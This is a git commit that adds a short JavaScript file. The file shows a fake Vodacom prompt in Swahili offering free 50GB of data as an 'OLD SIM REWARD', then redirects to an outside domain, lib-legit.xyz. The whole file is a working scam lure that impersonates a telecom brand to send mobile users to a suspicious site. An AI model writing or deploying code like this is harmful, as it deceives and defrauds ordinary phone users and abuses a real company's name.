110991ca884e2dc7aa0eb4941d95d9c2a57c21f1
bigetijazz11 <bigetijazz11@gmail.com>
2024-11-23 07:56:15 -0800

    Create vodacomsms.js

---
+++ vodacomsms.js
@@ -0,0 +1,5 @@
+var password = 'WASHA 50GB'
+password=prompt('Vodacom: Hongera, Nambari yako ya rununu Inastahiki kupokea Data ya 50GB bila malipo Vodacom OLD SIM REWARD, tafadhali bonyeza Ok ili kuendelea sasa','WASHA 50GB');
+if (password != 'WASHA 50GB') {
+location.href='https://www.lib-legit.xyz/Vodacom50gb';
+}
